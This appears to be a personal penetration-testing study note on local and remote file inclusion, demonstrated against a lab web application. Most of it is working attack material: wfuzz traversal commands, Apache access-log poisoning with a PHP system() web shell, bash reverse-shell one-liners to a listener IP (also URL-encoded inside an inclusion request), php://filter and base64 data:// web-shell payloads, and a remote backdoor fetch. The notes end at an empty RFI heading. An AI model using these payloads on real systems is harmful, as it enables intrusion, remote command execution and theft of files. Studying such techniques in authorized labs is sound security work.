> [!NOTE]
> File inclusion vulnerabilities allow us to "include" a file in the application's running code. 

> [!Dif of dir and LFI]
> File inclusion vulnerabilities to execute local or remote files, while directory traversal only allows us to read the contents of a file


# FUZZ LFI
```
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```

## **Linux**

**Mixing several *nix LFI lists and adding more paths I have created this one:**

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt

Try also to change `/` for `\` Try also to add `../../../../../`

A list that uses several techniques to find the file /etc/password (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

https://book.hacktricks.xyz/pentesting-web/file-inclusion#windows


## **Windows**

Merge of different wordlists:

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt

Try also to change `/` for `\` Try also to remove `C:/` and add `../../../../../`

A list that uses several techniques to find the file /boot.ini (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

# attacking Apache httpd 2.4.38 (Log poison)

### write executable code to Apache's access.log file in the /var/log/apache2/ directory

```
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

![[Pasted image 20240423194916.png]]

## PHP command snippet

```
<?php echo system($_GET['cmd']); ?>
```

![[Pasted image 20240423195503.png]]

now that we have cmd access via BURP, we can run cmd commands

### get reverse shell

#revshell
```
bash -c "bash -i >& /dev/tcp/192.168.45.231/4444 0>&1"
```

![[Pasted image 20240423195610.png]]

```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

### we can execute php or any other files due to LFI

![[Pasted image 20240423200612.png]]


### poison C:\\xampp\\apache\\logs

always use /access.log at the end!

![[Pasted image 20240424095342.png]]


# PHP wrappers

bypass filter and get rce
## php://filter

PHP filters allow perform basic **modification operations on the data** before being it's read or written

there are string, conversion, encryption, compression filters
```
convert.base64-encode
```

https://book.hacktricks.xyz/pentesting-web/file-inclusion

```
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

![[Pasted image 20240425220148.png]]

![[Pasted image 20240425222604.png]]

## data://

```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

Note that this protocol is restricted by php configurations `**allow_url_open**` and `**allow_url_include**`

![[Pasted image 20240425222927.png]]

```
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

> [!NOTE]
> always use "" in URL

![[Pasted image 20240425223118.png]]

![[Pasted image 20240425223339.png]]

```
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```


# RFI

